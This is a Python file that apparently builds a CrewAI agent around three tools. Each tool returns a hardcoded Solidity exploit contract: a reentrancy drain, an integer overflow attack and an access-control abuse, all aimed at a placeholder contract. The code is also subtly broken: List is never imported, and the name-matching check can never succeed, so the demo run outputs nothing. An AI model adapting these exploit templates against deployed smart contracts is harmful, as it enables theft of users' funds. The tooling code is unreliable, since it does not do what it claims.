from crewai import Agent, Tool
from langchain.llms import OpenAI
from langchain.prompts import PromptTemplate
from langchain.chains import LLMChain
from pydantic import BaseModel, Field
import json

class ExploitGeneratorTool(Tool):
    def __init__(self, name: str, description: str, exploit_func):
        super().__init__(name=name, description=description)
        self.exploit_func = exploit_func

    def _run(self, vulnerability: str) -> str:
        return self.exploit_func(vulnerability)

def generate_reentrancy_exploit(vulnerability: str) -> str:
    # Placeholder for reentrancy exploit generation
    # Example output: Reentrancy exploit code
    return """
    // Reentrancy Exploit Example
    contract ReentrancyExploit {
        VulnerableContract public vulnerableContract;

        constructor(address _vulnerableContract) {
            vulnerableContract = VulnerableContract(_vulnerableContract);
        }

        function attack() public {
            vulnerableContract.withdraw();
        }

        receive() external payable {
            if (address(vulnerableContract).balance >= 1 ether) {
                vulnerableContract.withdraw();
            }
        }
    }
    """

def generate_overflow_exploit(vulnerability: str) -> str:
    # Placeholder for integer overflow exploit generation
    # Example output: Overflow exploit code
    return """
    // Overflow Exploit Example
    contract OverflowExploit {
        VulnerableContract public vulnerableContract;

        constructor(address _vulnerableContract) {
            vulnerableContract = VulnerableContract(_vulnerableContract);
        }

        function attack() public {
            vulnerableContract.setValue(2**256 - 1);
            vulnerableContract.increment();
        }
    }
    """

def generate_access_control_exploit(vulnerability: str) -> str:
    # Placeholder for access control exploit generation
    # Example output: Access control exploit code
    return """
    // Access Control Exploit Example
    contract AccessControlExploit {
        VulnerableContract public vulnerableContract;

        constructor(address _vulnerableContract) {
            vulnerableContract = VulnerableContract(_vulnerableContract);
        }

        function attack() public {
            vulnerableContract.grantAccess(address(this));
            vulnerableContract.performRestrictedAction();
        }
    }
    """

class ExploitGeneratorAgent(Agent):
    def __init__(self):
        llm = OpenAI(temperature=0.7)
        
        reentrancy_tool = ExploitGeneratorTool(
            name="Reentrancy Exploit Generator",
            description="Generates exploit code for reentrancy vulnerabilities.",
            exploit_func=generate_reentrancy_exploit
        )
        
        overflow_tool = ExploitGeneratorTool(
            name="Overflow Exploit Generator",
            description="Generates exploit code for integer overflow vulnerabilities.",
            exploit_func=generate_overflow_exploit
        )
        
        access_control_tool = ExploitGeneratorTool(
            name="Access Control Exploit Generator",
            description="Generates exploit code for access control vulnerabilities.",
            exploit_func=generate_access_control_exploit
        )

        super().__init__(
            name="Exploit Generator Agent",
            role="Exploit Code Generator",
            goal="Generate exploit code based on identified vulnerabilities.",
            backstory="An expert in generating exploit code to demonstrate vulnerabilities in smart contracts.",
            verbose=True,
            llm=llm,
            tools=[reentrancy_tool, overflow_tool, access_control_tool]
        )
    
    def generate_exploits(self, vulnerabilities: List[str]) -> str:
        results = {}
        
        for vulnerability in vulnerabilities:
            for tool in self.tools:
                if tool.name.lower() in vulnerability.lower():
                    exploit_code = tool._run(vulnerability)
                    results[vulnerability] = exploit_code
                    break
        
        return json.dumps(results, indent=4)

if __name__ == "__main__":
    exploit_generator_agent = ExploitGeneratorAgent()
    
    vulnerabilities = [
        "Reentrancy vulnerability found in withdraw function.",
        "Integer overflow vulnerability detected in value increment.",
        "Access control issue allowing unauthorized function calls."
    ]
    
    exploits = exploit_generator_agent.generate_exploits(vulnerabilities)
    print(exploits)
